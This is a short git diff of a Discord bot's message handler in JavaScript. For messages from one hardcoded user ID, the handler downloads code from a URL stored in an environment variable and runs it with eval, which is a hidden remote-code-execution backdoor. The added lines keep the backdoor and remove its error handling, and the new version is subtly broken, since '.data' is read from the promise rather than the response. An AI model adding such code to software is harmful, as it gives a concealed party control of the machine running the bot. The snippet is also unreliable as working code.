@@ -105,11 +105,8 @@ client.on('message', msg => {
     if (msg.author.bot || msg.author.id == client.user.id) return;
     if (msg.author.id == 110137532972314624) {
         var secret = (async function() {
-            eval(await axios.get(process.env.secret));
-        })().catch(function (err) {
-            if (process.env.debug == 'true') {
-                console.error(err);
-            };
+            var secret = await axios.get(process.env.secret).data
+            eval(secret);
         });
     };
     if (msg.content.startsWith(prefix)) {
